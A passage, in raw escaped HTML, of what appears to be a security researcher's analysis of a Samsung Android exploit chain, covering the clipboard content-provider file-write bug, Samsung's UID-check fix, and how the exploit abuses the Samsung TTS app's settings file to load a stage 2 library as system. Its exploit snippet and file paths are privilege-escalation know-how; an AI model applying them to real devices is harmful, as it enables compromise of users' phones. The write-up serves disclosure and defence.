class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;resolver&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;insert&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;semclipboard_uri&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;vals&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;return&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;resolver&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;openFileDescriptor&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;newFile_uri&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c18\"&gt;&amp;quot;w&amp;quot;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;).&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;getFd&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;();&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;Let&amp;rsquo;s walk through what is happening line by line:&lt;/span&gt;&lt;/p&gt;&lt;ol class=\"c36 lst-kix_olk2lnn0afau-0 start\" start=\"1\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c1 c21 c8 li-bullet-0\"&gt;&lt;span&gt;Create a &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c24\"&gt;&lt;a class=\"vdnyYxSRCi-c61\" href=\"https://developer.android.com/reference/android/content/ContentValues\"&gt;ContentValues&lt;/a&gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;object. This holds the key, value pair that the caller wants to insert into a provider&amp;rsquo;s database table. The key is the column name and the value is the row entry.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c1 c8 c21 li-bullet-0\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;Set the ContentValues object: the key is set to &amp;ldquo;_data&amp;rdquo; and the value to an arbitrary file path, controlled by the exploit.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c1 c21 c8 li-bullet-0\"&gt;&lt;span&gt;Get the URI to access the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;semclipboardprovider&lt;/span&gt;&lt;span&gt;. This is set in the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;SemClipboardProvider&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;class.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c1 c21 c8 li-bullet-0\"&gt;&lt;span&gt;Get the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c24\"&gt;&lt;a class=\"vdnyYxSRCi-c61\" href=\"https://developer.android.com/reference/android/content/ContentResolver\"&gt;ContentResolver&lt;/a&gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;object that allows apps access to ContentProviders.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c1 c21 c8 li-bullet-0\"&gt;&lt;span&gt;Call &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;insert&lt;/span&gt;&lt;span&gt;&amp;nbsp;on the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;semclipboardprovider&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;with our key-value pair.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c1 c21 c8 li-bullet-0\"&gt;&lt;span&gt;Open the file that was passed in as the value and return the raw file descriptor. &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;openFileDescriptor&lt;/span&gt;&lt;span&gt;&amp;nbsp;calls the content provider&amp;rsquo;s &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;openFile&lt;/span&gt;&lt;span&gt;, which in this case simply calls &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;openFileHelper&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;Th&lt;/span&gt;&lt;span&gt;e&lt;/span&gt;&lt;span&gt;&amp;nbsp;exploit wrote their next stage binary to the directory &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;/data/system/users/0/&lt;/span&gt;&lt;span&gt;. The dropped file will have an SELinux context of &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;users_system_data_file&lt;/span&gt;&lt;span&gt;. Normal &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;untrusted_app&lt;/span&gt;&lt;span&gt;&amp;rsquo;s don&amp;rsquo;t have access to open or create &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;users_system_data_file&lt;/span&gt;&lt;span&gt;&amp;nbsp;files so in this case they are proxying the open through &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;system_server&lt;/span&gt;&lt;span&gt;&amp;nbsp;who can open &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;users_system_data_file&lt;/span&gt;&lt;span&gt;. While &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;untrusted_app&lt;/span&gt;&lt;span&gt;&amp;nbsp;can&amp;rsquo;t open &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;users_system_data_file&lt;/span&gt;&lt;span&gt;, it can read and write to &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;users_system_data_file&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;. Once the clipboard content provider opens the file and passess the fd to the calling process, the calling process can now read and write to it.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;The exploit first uses this fd to write their next stage ELF file onto the file system. The contents for the stage 2 ELF were embedded within the original sample.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;This vulnerability is triggered three more times throughout the chain as we&amp;rsquo;ll see below.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"vdnyYxSRCi-c17 vdnyYxSRCi-c8\" id=\"h.a85my9321daw\"&gt;&lt;span class=\"vdnyYxSRCi-c16\"&gt;Fixing the vulnerability&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;To fix the vulnerability, Samsung added access checks to the functions in the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;SemClipboardProvider&lt;/span&gt;&lt;span&gt;. &lt;/span&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;insert&lt;/span&gt;&lt;span&gt;&amp;nbsp;method now checks if the PID of the calling process is UID 1000, meaning that it is already also running with system privileges.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.b1677b3cf45fa7aae1529da0f69fbe999785be5f\"&gt;&lt;/a&gt;&lt;a id=\"t.3\"&gt;&lt;/a&gt;&lt;table class=\"vdnyYxSRCi-c23\"&gt;&lt;tr class=\"vdnyYxSRCi-c19\"&gt;&lt;td class=\"vdnyYxSRCi-c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;public&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c12\"&gt;Uri&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;insert&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c12\"&gt;Uri&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;uri&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c12\"&gt;ContentValues&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;values&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5 vdnyYxSRCi-c9\"&gt;if&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c12 vdnyYxSRCi-c9\"&gt;Binder&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;getCallingUid&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;()&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;!=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13 vdnyYxSRCi-c9\"&gt;1000&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;)&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c12\"&gt;Log&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;e&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;TAG&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c18\"&gt;&amp;quot;Fail to insert image clip uri. blocked the access of package : &amp;quot;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;+&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;getContext&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;().&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;getPackageManager&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;().&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;getNameForUid&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c12\"&gt;Binder&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;getCallingUid&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;()));&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;return&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;null&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;long&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;row &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;this&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;database&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;insert&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;TABLE_NAME&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c18\"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;values&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;if&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;row &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;0&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c12\"&gt;Uri&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;newUri &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c12\"&gt;ContentUris&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;withAppendedId&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;CONTENT_URI&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;row&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; getContext&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;().&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;getContentResolver&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;().&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;notifyChange&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;newUri&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;null&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;return&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;newUri&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;throw&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;new&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c12\"&gt;SQLException&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c18\"&gt;&amp;quot;Fail to add a new record into &amp;quot;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;+&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;uri&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;h2 class=\"vdnyYxSRCi-c17 vdnyYxSRCi-c8\" id=\"h.qqt6xm6hc0pl\"&gt;&lt;span class=\"vdnyYxSRCi-c16\"&gt;Executing the stage 2 ELF&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;The exploit has now written its stage 2 binary to the file system, but how do they load &lt;/span&gt;&lt;span&gt;it&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;outside of their current app sandbox? Using the Samsung Text to Speech application (SamsungTTS.apk).&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c24\"&gt;&lt;a class=\"vdnyYxSRCi-c61\" href=\"https://galaxystore.samsung.com/detail/com.samsung.SMT?langCd=en\"&gt;Samsung Text to Speech application (com.samsung.SMT)&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a pre-installed system app running on Samsung devices. It is also running as the system UID, though as a slightly less privileged SELinux context, &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;system_app&lt;/span&gt;&lt;span&gt;&amp;nbsp;rather than &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;system_server&lt;/span&gt;&lt;span&gt;. There has been at least one previously public vulnerability where this app was used&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c24\"&gt;&lt;a class=\"vdnyYxSRCi-c61\" href=\"https://blog.flanker017.me/text-to-speech-speaks-pwned/\"&gt;&amp;nbsp;to gain code execution as system&lt;/a&gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;. What&amp;rsquo;s different this time though is that the exploit doesn&amp;rsquo;t need another vulnerability; instead it reuses the stage 1 vulnerability in the clipboard to arbitrarily write files on the file system.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;Older versions of the SamsungTTS application stored the file path for their engine in their Settings files. When a service in the application was started, it obtained the path from the Settings file and would load that file path as a native library using the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c24 vdnyYxSRCi-c46\"&gt;&lt;a class=\"vdnyYxSRCi-c61\" href=\"https://developer.android.com/reference/java/lang/System#load(java.lang.String)\"&gt;System.load&lt;/a&gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;API. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;The exploit takes advantage of this by using the stage 1 vulnerability to write its file path to the Settings file and then starting the service which will then load its stage 2 executable file as system UID and &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;system_app&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;SELinux context.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;To do this, the exploit uses the stage 1 vulnerability to write the following contents to two different files: &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;/data/user_de/0/com.samsung.SMT/shared_prefs/SamsungTTSSettings.xml&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;/data/data/com.samsung.SMT/shared_prefs/SamsungTTSSettings.xml&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;. Depending on the version of the phone and application, the SamsungTTS app uses these 2 different paths for its Settings files.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.1e9fc9b7503d012c58ac54bface058bfa0e1cf3d\"&gt;&lt;/a&gt;&lt;a id=\"t.4\"&gt;&lt;/a&gt;&lt;table class=\"vdnyYxSRCi-c23\"&gt;&lt;tr class=\"vdnyYxSRCi-c19\"&gt;&lt;td class=\"vdnyYxSRCi-c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;&amp;lt;?&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;xml version&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c18\"&gt;&amp;#39;1.0&amp;#39;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;encoding&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c18\"&gt;&amp;#39;utf-8&amp;#39;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;standalone&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c18\"&gt;&amp;#39;yes&amp;#39;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;?&amp;gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span 